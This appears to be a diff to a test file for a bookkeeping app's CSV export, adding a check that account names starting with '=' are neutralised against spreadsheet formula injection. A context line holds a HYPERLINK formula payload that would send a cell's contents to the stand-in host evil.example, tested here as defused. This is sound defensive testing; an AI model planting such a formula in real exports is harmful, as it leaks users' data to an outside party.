@@ -29,3 +29,12 @@ test("exported text columns neutralise formula-looking descriptions; amounts sta
   assert.ok(lines.some((r) => r[2] === "'=HYPERLINK(\"http://evil.example/?x=\"&A1,\"Click\")"));
   assert.ok(lines.some((r) => r[2] === "Plain coffee"));
 });
+
+test("a chart-of-accounts name that starts with = is neutralised in the line and journal exports", () => {
+  let b = importStatement(newBooks(), CSV, "1000").books;
+  b = { ...b, accounts: b.accounts.map((a) => (a.code === "6100" ? { ...a, name: "=1+1 Supplies" } : a)) };
+  b = confirm(b, Object.fromEntries(b.transactions.map((t) => [t.id, t.cents < 0 ? "6100" : "4000"])));
+  const lines = parseCsv(exportLines(b)).slice(1).filter((r) => r.length > 1);
+  for (const r of lines) for (const i of [6, 9]) assert.ok(!/^[=+@-]/.test(r[i] ?? ""), `col ${i}: ${r[i]}`);
+  assert.ok(lines.some((r) => r[6] === "'=1+1 Supplies"));
+});
